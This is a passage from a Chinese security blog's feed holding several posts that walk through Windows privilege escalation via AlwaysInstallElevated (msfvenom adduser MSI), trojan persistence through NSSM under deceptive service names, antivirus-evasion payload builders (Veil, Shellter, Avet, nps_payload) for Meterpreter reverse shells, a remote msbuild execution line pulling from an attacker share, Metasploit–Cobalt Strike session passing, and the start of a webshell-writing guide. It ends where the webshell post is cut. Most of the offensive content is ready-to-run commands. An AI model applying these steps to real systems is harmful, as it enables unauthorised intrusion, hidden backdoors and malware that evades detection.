    <content type="html"><![CDATA[<h2 id="AlwaysInstallElevated提权"><a href="#AlwaysInstallElevated提权" class="headerlink" title="AlwaysInstallElevated提权"></a>AlwaysInstallElevated提权</h2><p>windows有一个系统进程MSIEXEC，用于安装Windows Installer安装包，AlwaysInstallElevated是一个组策略配置，如果启用，那么将允许普通用户以SYSTEM权限运行msi文件进行安装。如果对方机器恰好开启，我们就可以利用此缺陷提权。</p><h2 id="powerup"><a href="#powerup" class="headerlink" title="powerup"></a>powerup</h2><p>下载链接：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></p><p>powerup的利用：</p><p>检查注册表的设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -<span class="hljs-built_in">exec</span> bypass -Command <span class="hljs-string">&quot;&amp; &#123;import-module .\powerup.ps1; get-registryalwaysinstallelevated&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>生成新的账户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -<span class="hljs-built_in">exec</span> bypass -Command <span class="hljs-string">&quot;&amp; &#123;import-module .\powerup.ps1; write-useraddmsi&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/alwaysinstall/always01.png"></p><p>生成一个msi文件</p><p>使用以下命令静默安装即可生成新用户</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msiexec <span class="hljs-regexp">/q /i</span> useradd.msi<br></code></pre></td></tr></table></figure><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>msf生成</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/adduser <span class="hljs-attribute">USER</span>=test1 <span class="hljs-attribute">PASSWORD</span>=passwd1 -f msi -o up.msi<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/alwaysinstall/always02.png"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">msiexec <span class="hljs-string">/quiet</span> <span class="hljs-string">/qn</span> <span class="hljs-string">/i</span> up.msi<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>提权</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集总结</title>
    <link href="/2021/05/31/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/"/>
    <url>/2021/05/31/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前也总结过类似的信息收集相关的文章，但是每隔一段时间理解和手法都会有所不同，本文以hvv或授权但仅提供公司名称域名等情况下渗透测试的视角总结一些自己最近做信息收集的流程套路。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="一、初始已知信息"><a href="#一、初始已知信息" class="headerlink" title="一、初始已知信息"></a>一、初始已知信息</h3><p>前言中提到的两种情况，一般初始信息只有公司名称、个别官网域名、靶标名称等信息，以此为起点进行信息收集。</p><h3 id="二、搜寻根域名"><a href="#二、搜寻根域名" class="headerlink" title="二、搜寻根域名"></a>二、搜寻根域名</h3><p>此步骤个人的经验是，面对大公司优先选择工信部备案查询，小公司用搜索引擎做起点，然后几种方式都可以过一遍，查漏补缺，尽量获取最全的信息。大部分公司根域名都不会很多，全部过一遍也不会用掉多少时间。</p><h4 id="1-搜索引擎"><a href="#1-搜索引擎" class="headerlink" title="1.搜索引擎"></a>1.搜索引擎</h4><p>搜索引擎直接搜索其公司名称，获取其相关根域名</p><h4 id="2-天眼查、企查查"><a href="#2-天眼查、企查查" class="headerlink" title="2.天眼查、企查查"></a>2.天眼查、企查查</h4><p>从天眼查、企查查等途径，输入公司名，查询其域名以及全资控股子公司的域名</p><p><a href="https://www.qcc.com/">https://www.qcc.com/</a></p><p><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><h4 id="3-工信部备案"><a href="#3-工信部备案" class="headerlink" title="3.工信部备案"></a>3.工信部备案</h4><p>工信部备案查询域名/ip地址（需要详细且正确的公司名称，结果也会很全面）</p><p><a href="https://beian.miit.gov.cn/#/Integrated/recordQuery">https://beian.miit.gov.cn/#/Integrated/recordQuery</a></p><h4 id="4-fofa"><a href="#4-fofa" class="headerlink" title="4.fofa"></a>4.fofa</h4><p>fofa查询其公司名称，获取相关域名</p><h4 id="5-站长之家"><a href="#5-站长之家" class="headerlink" title="5.站长之家"></a>5.站长之家</h4><p>使用其icp查询功能查询备案，当我们不知道公司完整名称的时候也可以使用此网站功能使用已知域名查询完整备案公司名称</p><p><a href="http://icp.chinaz.com/">http://icp.chinaz.com/</a></p><h4 id="6-反查域名"><a href="#6-反查域名" class="headerlink" title="6.反查域名"></a>6.反查域名</h4><p>用已知的某些ip反查域名</p><p><a href="https://dns.aizhan.com/">https://dns.aizhan.com/</a></p><p><a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><h3 id="三、子域名"><a href="#三、子域名" class="headerlink" title="三、子域名"></a>三、子域名</h3><p>在子域名收集这步本人一般不喜欢爆破的方式，子域名爆破比较依赖字典，字典小就收集不全，字典大就很费时间，所以一般优先在各类解析记录的网站查询。</p><h4 id="1-各类网站查询解析记录"><a href="#1-各类网站查询解析记录" class="headerlink" title="1.各类网站查询解析记录"></a>1.各类网站查询解析记录</h4><p>以bilibili为例：</p><p><a href="https://www.dnsgrep.cn/subdomain/bilibili.com">https://www.dnsgrep.cn/subdomain/bilibili.com</a></p><p><a href="https://securitytrails.com/list/apex_domain/bilibili.com">https://securitytrails.com/list/apex_domain/bilibili.com</a></p><p>类似的网站非常多，这两个都是免费的，但是第二个要注册登录</p><h4 id="2-子域名爆破"><a href="#2-子域名爆破" class="headerlink" title="2.子域名爆破"></a>2.子域名爆破</h4><p>相关的工具很多，部分扫描器也自带子域名爆破功能或可安装相关插件。</p><p>subDomainsBrute</p><p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><h4 id="3-fofa、shodan"><a href="#3-fofa、shodan" class="headerlink" title="3.fofa、shodan"></a>3.fofa、shodan</h4><p>利用这类工具对域名资产进行查询，如<br>fofa语法domain=”xxx.com”</p><h4 id="4-OneForAll"><a href="#4-OneForAll" class="headerlink" title="4.OneForAll"></a>4.OneForAll</h4><p>此工具会集成多种方式搜集子域名，包括dns查询、证书查询等，详情见其项目中的readme</p><p>安装</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shmilylty/</span>OneForAll.git<br>cd OneForAll/<br>python3 -m pip install -U pip setuptools wheel -i https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/pypi/</span>simple/<br>pip3 install -r requirements.txt -i https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/pypi/</span>simple/<br>python3 oneforall.py --help<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> oneforall.<span class="hljs-keyword">py</span> --target example.<span class="hljs-keyword">com</span> run<br><span class="hljs-keyword">python3</span> oneforall.<span class="hljs-keyword">py</span> --targets ./example.txt run<br></code></pre></td></tr></table></figure><p><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><h3 id="四、ip"><a href="#四、ip" class="headerlink" title="四、ip"></a>四、ip</h3><p>ip列表不完全来源于域名解析，有一部分ip是直接使用ip地址提供服务的，需要提前收集这部分信息，另一部分是通过域名解析过来的。</p><h4 id="1-各类网站查询解析记录-1"><a href="#1-各类网站查询解析记录-1" class="headerlink" title="1.各类网站查询解析记录"></a>1.各类网站查询解析记录</h4><p>同子域名查询中的操作，但是需要做的是把ip列表导出</p><h4 id="2-解析域名"><a href="#2-解析域名" class="headerlink" title="2.解析域名"></a>2.解析域名</h4><p>将所有已收集到的子域名通过脚本批量调用dig或nslookup解析ip</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">nslookup xxx.<span class="hljs-keyword">com</span><br><span class="hljs-keyword">dig</span> xxx.<span class="hljs-keyword">com</span> @<span class="hljs-number">114.114</span>.<span class="hljs-number">114.114</span><br></code></pre></td></tr></table></figure><p>编写脚本批量调用dig命令，导出结果</p><p>或将域名列表放在在线解析网站中，导出其解析结果</p><p>这个步骤中需要额外关注cdn的情况，绕过cdn寻找其真实ip，可参考这篇文档</p><p><a href="https://github.com/bin-maker/2021CDN">https://github.com/bin-maker/2021CDN</a></p><h4 id="3-c段"><a href="#3-c段" class="headerlink" title="3.c段"></a>3.c段</h4><p>将前面已经获得的ip全部整理好，使用脚本进行排序，懒得写脚本也可以使用在线的功能</p><p>如ip地址排序计算器<br><a href="https://www.jisuan.mobi/p616N6bz3bNb1yPQ.html">https://www.jisuan.mobi/p616N6bz3bNb1yPQ.html</a></p><p>得到排序好的ip，可以先自己判断哪些c段可能属于目标，再进行一些扫描和访问，整理更全面的ip列表。</p><h3 id="五、端口"><a href="#五、端口" class="headerlink" title="五、端口"></a>五、端口</h3><p>使用masscan、nmap等工具对端口信息进行收集</p><h3 id="六、web服务"><a href="#六、web服务" class="headerlink" title="六、web服务"></a>六、web服务</h3><p>使用webfinder等工具扫描已整理ip列表的web常用端口，导出形如<a href="http://xxx.com:port/以及https://xxx.com:port/的web服务列表">http://xxx.com:port/以及https://xxx.com:port/的web服务列表</a></p><h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p>1.<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br>2.<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p><h3 id="七、漏扫"><a href="#七、漏扫" class="headerlink" title="七、漏扫"></a>七、漏扫</h3><h4 id="1-主机扫描"><a href="#1-主机扫描" class="headerlink" title="1.主机扫描"></a>1.主机扫描</h4><p>上文整理好的ip列表和域名列表，可以丢入主机扫描相关的扫描器中，如goby、Nessus等</p><h3 id="2-web扫描"><a href="#2-web扫描" class="headerlink" title="2.web扫描"></a>2.web扫描</h3><p>整理好web服务列表，可以丢入awvs等工具进行扫描，同时可以联动xray批量扫描</p>]]></content>
    
    
    <categories>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用nssm注册windows服务进行持久化</title>
    <link href="/2021/05/27/%E4%BD%BF%E7%94%A8nssm%E6%B3%A8%E5%86%8Cwindows%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    <url>/2021/05/27/%E4%BD%BF%E7%94%A8nssm%E6%B3%A8%E5%86%8Cwindows%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>NSSM是一款注册Windows系统服务的工具。将应用程序注册为windows系统服务可以使其在系统停止、重启等情况仍可自动运行，可用于持久化后门。</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="http://www.nssm.cc/download">http://www.nssm.cc/download</a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>解压并在nssm.exe目录打开cmd</p><p>使用如下命令注册服务</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">nssm <span class="hljs-keyword">install</span> 服务名<br></code></pre></td></tr></table></figure><p>填写木马路径和服务名，可以填写欺骗性较强的服务名</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/nssm/nssm_01.png"></p><p>在服务里设置自动启动</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/nssm/nssm_02.png"></p><p>重启对方机器，在msf中开启监听，成功得到shell</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/nssm/nssm_03.png"></p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>几款远控免杀工具使用总结</title>
    <link href="/2021/05/25/%E5%87%A0%E6%AC%BE%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2021/05/25/%E5%87%A0%E6%AC%BE%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>后渗透过程中往往要使用msf和cs等工具的木马，而默认生成的木马非常容易被杀毒软件检出，这个时候就需要对木马进行免杀，本文介绍几款免杀工具的使用。</p><p>虽然经过杀毒软件多年更新，这些工具免杀效果可能已经很一般了，但是相比于自己写编码器解码器来做免杀更为方便简单，没有任何编程积累也可以直接使用。</p><h2 id="veil"><a href="#veil" class="headerlink" title="veil"></a>veil</h2><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><p>docker安装veil</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull mattiasohlsson/veil<br></code></pre></td></tr></table></figure><p>映射路径并运行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker run -it -v <span class="hljs-regexp">/tmp/</span>veil-output:<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/veil/</span>output:Z mattiasohlsson/veil<br></code></pre></td></tr></table></figure><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>list命令可查看其两个免杀工具，Evasion和Ordnance</p><ul><li>Evasion可用于文件免杀</li><li>Ordnance可生成shellcode</li></ul><h3 id="生成msf免杀payload"><a href="#生成msf免杀payload" class="headerlink" title="生成msf免杀payload"></a>生成msf免杀payload</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">进入Evasion<br><span class="hljs-keyword">use</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/shellcode_bypass/bypass01.png"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lsl">查看可用的payloads<br><span class="hljs-type">list</span> payloads<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/shellcode_bypass/bypass02.png"></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">选择要使用的payloads，如选择ruby的meterpreter/rev_tcp<br><span class="hljs-keyword">use</span> <span class="hljs-number">39</span><br></code></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">设置监听ip和端口<br><span class="hljs-keyword">set</span> lhost <span class="hljs-comment">xx.xx.xx.xx</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4444</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/shellcode_bypass/bypass03.png"></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">生成可执行文件并取名test<br>generate<br>test<br>由于刚才配置了映射路径，可执行文件被生成在本机的/tmp/veil-output/compiled路径下，对应的msf的配置文件被生成在/tmp/veil-output/handlers路径下<br><br>在本地使用msf配置文件开启msf监听<br>msfconsole -r test.rc<br><br>将test.exe传入目标机器，并运行，反弹回shell<br></code></pre></td></tr></table></figure><h3 id="使用自定义payload生成免杀木马"><a href="#使用自定义payload生成免杀木马" class="headerlink" title="使用自定义payload生成免杀木马"></a>使用自定义payload生成免杀木马</h3><p>使用cs的payload为例</p><p>首先在cs的界面，攻击-生成后门-payload generator-veil，保存为payload.txt</p><p>开启veil，之前步骤同上</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs verilog">选择<span class="hljs-number">13</span>号payload<br><span class="hljs-keyword">generate</span><br></code></pre></td></tr></table></figure><p>在generate之后的选项中选择3号，自定义payload，然后粘贴payload.txt内容，确认生成</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/shellcode_bypass/bypass04.png"></p><h2 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h2><h3 id="下载安装-1"><a href="#下载安装-1" class="headerlink" title="下载安装"></a>下载安装</h3><p>下载windows版</p><p><a href="https://www.shellterproject.com/download/">https://www.shellterproject.com/download/</a></p><h3 id="使用shellter注入shellcode"><a href="#使用shellter注入shellcode" class="headerlink" title="使用shellter注入shellcode"></a>使用shellter注入shellcode</h3><p>寻找或自行编译一个32位pe程序作为载体</p><p>打开shellter</p><p>设置注入目标pe程序</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/shellcode_bypass/bypass05.png"></p><p>选择本地payload或自定义payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">L为本地<br>输入1选择常规的Meterpreter_Reverse_TCP<br></code></pre></td></tr></table></figure><p>设置lhost和lport</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/shellcode_bypass/bypass06.png"></p><p>成功生成免杀恶意程序</p><h2 id="Avet"><a href="#Avet" class="headerlink" title="Avet"></a>Avet</h2><h3 id="下载安装-2"><a href="#下载安装-2" class="headerlink" title="下载安装"></a>下载安装</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/govolution/</span>avet<br>cd avet<br>./setup.sh<br></code></pre></td></tr></table></figure><h3 id="使用Avet生成免杀文件"><a href="#使用Avet生成免杀文件" class="headerlink" title="使用Avet生成免杀文件"></a>使用Avet生成免杀文件</h3><p>启动</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> ./avet.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><p>选择要使用的payload编号</p><p>设置监听ip端口以及其他配置</p><p>生成免杀可执行文件</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/shellcode_bypass/bypass07.png"></p><h2 id="nps-payload"><a href="#nps-payload" class="headerlink" title="nps_payload"></a>nps_payload</h2><h3 id="下载安装-3"><a href="#下载安装-3" class="headerlink" title="下载安装"></a>下载安装</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone  https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/trustedsec/</span>nps_payload<br>cd nps_payload/<br>pip install -r requirements.txt<br></code></pre></td></tr></table></figure><h3 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> nps_payload.<span class="hljs-keyword">py</span><br><br>选择<span class="hljs-number">1</span>生成msf类型payload<br><br>选择payload类型<br><br>设置IP和端口<br><br>生成<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/shellcode_bypass/bypass08.png"></p><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">1. 本地加载执行:<br>- <span class="hljs-variable">%windir%</span><span class="hljs-symbol">\M</span>icrosoft.NET<span class="hljs-symbol">\F</span>ramework<span class="hljs-symbol">\v</span>4.0.30319<span class="hljs-symbol">\m</span>sbuild.exe &lt;folder_path_here&gt;<span class="hljs-symbol">\m</span>sbuild_nps.xml<br><br>2. 远程文件执行:<br><br>wmiexec.py &lt;USER&gt;:&#x27;&lt;PASS&gt;&#x27;@&lt;RHOST&gt; cmd.exe /c start <span class="hljs-variable">%windir%</span><span class="hljs-symbol">\M</span>icrosoft.NET<span class="hljs-symbol">\F</span>ramework<span class="hljs-symbol">\v</span>4.0.30319<span class="hljs-symbol">\m</span>sbuild.exe <span class="hljs-symbol">\\</span>&lt;attackerip&gt;<span class="hljs-symbol">\&lt;</span>share&gt;<span class="hljs-symbol">\m</span>sbuild_nps.xml<br></code></pre></td></tr></table></figure><p>msf监听</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">msfconsole</span> -r msbuild_nps.rc<br></code></pre></td></tr></table></figure><h2 id="TheFatRat"><a href="#TheFatRat" class="headerlink" title="TheFatRat"></a>TheFatRat</h2><h3 id="下载安装-4"><a href="#下载安装-4" class="headerlink" title="下载安装"></a>下载安装</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/Screetsec/TheFatRat<br><span class="hljs-keyword">cd</span> TheFatRat<br>chmod +<span class="hljs-keyword">x</span> setup.<span class="hljs-keyword">sh</span><br>./setup.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fatrat</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf与cs互相转换</title>
    <link href="/2021/05/21/msf%E4%B8%8Ecs%E4%BA%92%E7%9B%B8%E8%BD%AC%E6%8D%A2/"/>
    <url>/2021/05/21/msf%E4%B8%8Ecs%E4%BA%92%E7%9B%B8%E8%BD%AC%E6%8D%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="msf转cs"><a href="#msf转cs" class="headerlink" title="msf转cs"></a>msf转cs</h2><p>在cs中配置新监听器，beacon_http即可，设置好监听ip和端口</p><p>使用msf payload_inject模块注入一个新的cs的shell</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams">background<br>use exploit/windows/local/payload_inject<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_http</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost cs</span>的<span class="hljs-comment">ip</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport cs</span>的<span class="hljs-comment">port</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">session</span> 需要转换的<span class="hljs-comment">session</span>编号<br><span class="hljs-keyword">set</span> <span class="hljs-comment">disablepayloadhandler true</span><br>run<br></code></pre></td></tr></table></figure><h2 id="cs转msf"><a href="#cs转msf" class="headerlink" title="cs转msf"></a>cs转msf</h2><p>在msf中开启通常的监听</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_http</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost xx.xx.xx.xx</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport xxxx</span><br>run<br></code></pre></td></tr></table></figure><p>在cs中选择已存在的shell，右键-&gt;spawn</p><p>选择foreign类型的监听器，填写msf的ip和端口</p><p>选择此监听器转换shell到msf</p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行写webshell总结</title>
    <link href="/2021/05/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%86%99webshell%E6%80%BB%E7%BB%93/"/>
    <url>/2021/05/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%86%99webshell%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们找到一个rce漏洞却无法反弹shell时，在web路径写webshell用连接工具进行管理会方便的多，本文总结从命令执行到webshell的流程化操作。</p><h2 id="寻找web路径"><a href="#寻找web路径" class="headerlink" title="寻找web路径"></a>寻找web路径</h2><p>写webshell当然要写在web路径，第一步要做的就是快速寻找web路径</p><h3 id="1-文件查找法"><a href="#1-文件查找法" class="headerlink" title="1.文件查找法"></a>1.文件查找法</h3><p>一般web路径一定会有index.html\php\jsp\asp，login.xxx文件。可以根据已知页面文件名全局搜索</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">linux:<br><span class="hljs-keyword">find</span> / -name <span class="hljs-built_in">index</span>.php<br><span class="hljs-keyword">find</span> / -name <span class="hljs-built_in">index</span>.*<br>window<span class="hljs-variable">s:</span><br><span class="hljs-keyword">for</span> /r d:/ %i in (<span class="hljs-built_in">index</span>.html) <span class="hljs-keyword">do</span> @echo %i<br><span class="hljs-keyword">for</span> /r d:/ %i in (<span class="hljs-built_in">index</span>.*) <span class="hljs-keyword">do</span> @echo %i<br></code></pre></td></tr></table></figure><h3 id="2-源码查找法"><a href="#2-源码查找法" class="headerlink" title="2.源码查找法"></a>2.源码查找法</h3><p>也可以选择打开当前已知web页面的f12查看源码，寻找一段特征足够明显的源码进行查找</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">linux:<br><span class="hljs-keyword">find</span> / -name <span class="hljs-string">&quot;*.*&quot;</span> | xargs <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;PHP installed properly&quot;</span><br><span class="hljs-keyword">find</span> <span class="hljs-regexp">/var/</span>www/ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;doServerTest()&quot;</span><br><br>windows:<br>findstr <span class="hljs-regexp">/s/i</span><span class="hljs-regexp">/n /</span>d:D:\sec_tools\ /c:<span class="hljs-string">&quot;html&quot;</span> *.html<br>findstr <span class="hljs-regexp">/s/i</span><span class="hljs-regexp">/n /</span>d:C:\windows\ /c:<span class="hljs-string">&quot;success&quot;</span> *.*<br></code></pre></td></tr></table></figure><h3 id="3-history等"><a href="#3-history等" class="headerlink" title="3.history等"></a>3.history等</h3><p>通过linux历史命令查找web相关的服务启动命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 